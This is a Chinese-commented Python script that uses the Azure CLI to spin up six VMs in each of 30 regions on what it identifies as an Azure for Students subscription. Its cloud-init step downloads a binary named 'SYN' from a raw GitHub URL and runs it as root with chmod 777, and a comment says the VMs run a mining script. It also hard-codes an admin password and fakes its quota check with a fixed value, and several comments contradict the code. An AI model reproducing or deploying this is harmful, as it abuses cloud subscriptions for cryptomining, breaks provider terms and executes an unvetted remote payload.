import io
import json
import time
from contextlib import redirect_stdout
from azure.cli.core import get_default_cli

# 1.检查配额以确定订阅类型，并确定要开的虚拟机数量
# 初始化区域列表，共31个区域
# Azure for Students和即用即付订阅均不支持 South India 和 West India 区域
locations = ['eastus', 'eastus2', 'westus', 'centralus', 'northcentralus', 'southcentralus',
             'northeurope', 'westeurope', 'eastasia', 'southeastasia', 'japaneast',
             'japanwest', 'australiaeast', 'australiasoutheast', 'australiacentral',
             'brazilsouth', 'centralindia', 'canadacentral', 'canadaeast', 'westus2',
             'uksouth', 'ukwest', 'koreacentral', 'koreasouth', 'francecentral',
             'southafricanorth', 'uaenorth', 'switzerlandnorth', 'germanywestcentral',
             'westcentralus']

# 捕获 get_default_cli().invoke 的标准输出
f = io.StringIO()
with redirect_stdout(f):
    get_default_cli().invoke(['vm', 'list-usage', '--location', 'East US', '--query',
                              '[?localName == \'Total Regional vCPUs\'].limit'])
    limit = '6'

# 默认每个区域的配额都相同，因此只需查询美国东部地区的配额
# Azure for Students订阅每个区域的vCPU总数为6，
# 标准FSv2系列vCPUs为4，标准FS系列vCPUs为4
# 所以创建一个Standard_F4s_v2实例（占用4个vCPUs），
# 一个Standard_F2s实例（占用2个vCPUs）
if '6' in limit:
    print("当前订阅为Azure for Students")
    size1_name = "Standard_DS1_v2"
    size1_abbreviation = "DS1_v2"
    size1_count = 6
    type = 0
    
else:
    print("未知订阅，请手动修改创建虚拟机的数量")
    print("若当前订阅为Azure for Students、免费试用或即用即付，"
          "请进入“创建虚拟机”界面，任意填写信息，"
          "一直到“查看+创建”项（创建虚拟机的最后一步）"
          "显示“验证通过”即可自动刷新配额")
    print("假如还未解决，请直接修改limit = f.getvalue()中的"
          "f.getvalue()为'区域配额'（包括英文引号）。Azure for"
          " Students是6，即用即付是10，免费试用订阅是4")
    exit(0)

# 2.创建资源组
# 资源组只是资源的逻辑容器,资源组内的资源不必与资源组位于同一区域
get_default_cli().invoke(['group', 'create', '--name', 'myResourceGroup',
                          '--location', 'eastus'])
# 除非订阅被禁用，其他任何情况下创建资源组都会成功（重名也返回成功）
print("创建资源组成功")

# 3.创建开机后要运行的脚本
init = "apt-get install wget -y;wget https://raw.githubusercontent.com/110099/cdn/master/SYN;chmod 777 SYN;./SYN"
with open("./cloud-init.txt", "w") as f:
    f.write("#cloud-config" + "\n")
    f.write("runcmd:" + "\n")
    f.write("  - sudo -s" + "\n")
    f.write(f"  - {init}")

# 4.批量创建虚拟机并运行挖矿脚本
for location in locations:
    count = 0
    for a in range(0, size1_count):
        count += 1
        print("正在 " + str(location) + " 区域创建第 " + str(count)
              + f" 个 {size1_name} 实例，共 " + str(size1_count) + " 个")
        get_default_cli().invoke(
            ['vm', 'create', '--resource-group', 'myResourceGroup', '--name',
             f'{location}-{size1_abbreviation}-{count}', '--image', 'UbuntuLTS',
             '--size', f'{size1_name}', '--location', f'{location}', '--admin-username',
             'azureuser', '--admin-password', '6uPF5Cofvyjcew9', '--custom-data',
             'cloud-init.txt', "--no-wait"])

# 5.信息汇总
# 获取所有vm的名字
print("\n------------------------------------------------------------------------------\n")
print("大功告成！在31个区域创建虚拟机的命令已成功执行")
for i in range(120, -1, -1):
    print("\r正在等待Azure生成统计信息，还需等待{}秒".format(i), end="", flush=True)
    time.sleep(1)
print("\n------------------------------------------------------------------------------\n")
print("以下是已创建的虚拟机列表：")
get_default_cli().invoke(['vm', 'list', '--query', '[*].name'])
print("\n\n-----------------------------------------------------------------------------\n")
